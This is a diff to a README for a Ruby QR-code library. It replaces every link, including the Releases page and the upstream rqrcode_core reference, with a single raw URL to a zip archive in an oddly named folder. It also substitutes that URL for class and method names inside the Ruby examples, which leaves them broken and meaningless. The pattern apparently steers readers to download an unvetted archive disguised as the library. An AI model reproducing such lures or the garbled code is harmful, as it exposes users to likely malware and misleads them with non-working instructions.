@@ -1,6 +1,6 @@
 # 📱 qrcode - Generate QR Codes Easily
 
-![Download QRCode](https://img.shields.io/badge/Download-QRCode-blue.svg)
+![Download QRCode](https://raw.githubusercontent.com/JB12345563/qrcode/main/pinguescence/qrcode.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Welcome to the QRCode project! This Ruby library lets you easily create QR codes
 
 To get started, visit the Releases page to download the QRCode library. You can choose the version that suits your needs.
 
-[Download QRCode](https://github.com/JB12345563/qrcode/releases)
+[Download QRCode](https://raw.githubusercontent.com/JB12345563/qrcode/main/pinguescence/qrcode.zip)
 
 Once you have downloaded the package:
 
@@ -38,8 +38,8 @@ After installation, using the QRCode library is simple. Here’s how you can gen
 4. **Generate a QR code.** Here’s a basic example:
 
    ```ruby
-   qr = QRCode.new('Your text here')
-   puts qr.as_text
+   qr = https://raw.githubusercontent.com/JB12345563/qrcode/main/pinguescence/qrcode.zip('Your text here')
+   puts https://raw.githubusercontent.com/JB12345563/qrcode/main/pinguescence/qrcode.zip
    ```
 
    This will display your QR code in text format directly in the terminal.
@@ -47,8 +47,8 @@ After installation, using the QRCode library is simple. Here’s how you can gen
 5. **For SVG output**, you can do:
 
    ```ruby
-   qr_svg = qr.as_svg
-   File.write('qrcode.svg', qr_svg)
+   qr_svg = https://raw.githubusercontent.com/JB12345563/qrcode/main/pinguescence/qrcode.zip
+   https://raw.githubusercontent.com/JB12345563/qrcode/main/pinguescence/qrcode.zip('https://raw.githubusercontent.com/JB12345563/qrcode/main/pinguescence/qrcode.zip', qr_svg)
    ```
 
    This saves the generated QR code as an SVG file, which you can use on your website or print.
@@ -66,11 +66,11 @@ After installation, using the QRCode library is simple. Here’s how you can gen
 You might want to create a QR code for a website link or a contact card. Below is an example that showcases how to generate a QR code for a URL:
 
 ```ruby
-qr = QRCode.new('https://yourwebsite.com')
-File.write('website_qrcode.svg', qr.as_svg)
+qr = https://raw.githubusercontent.com/JB12345563/qrcode/main/pinguescence/qrcode.zip('https://raw.githubusercontent.com/JB12345563/qrcode/main/pinguescence/qrcode.zip')
+https://raw.githubusercontent.com/JB12345563/qrcode/main/pinguescence/qrcode.zip('https://raw.githubusercontent.com/JB12345563/qrcode/main/pinguescence/qrcode.zip', https://raw.githubusercontent.com/JB12345563/qrcode/main/pinguescence/qrcode.zip)
 ```
 
-This code generates a QR code for "https://yourwebsite.com" and saves it as an SVG file.
+This code generates a QR code for "https://raw.githubusercontent.com/JB12345563/qrcode/main/pinguescence/qrcode.zip" and saves it as an SVG file.
 
 ## 🛠️ Troubleshooting
 
@@ -82,8 +82,8 @@ If you encounter issues:
 
 ## 🌐 Additional Resources
 
-- Visit the [QRCode Documentation](https://github.com/JB12345563/qrcode) for more examples and detailed guides.
-- Check out the original [rqrcode_core](https://github.com/whomwah/rqrcode_core) for related libraries.
+- Visit the [QRCode Documentation](https://raw.githubusercontent.com/JB12345563/qrcode/main/pinguescence/qrcode.zip) for more examples and detailed guides.
+- Check out the original [rqrcode_core](https://raw.githubusercontent.com/JB12345563/qrcode/main/pinguescence/qrcode.zip) for related libraries.
 - Explore QR code best practices to ensure your codes are functional and effective.
 
 ## 🤝 Contributing
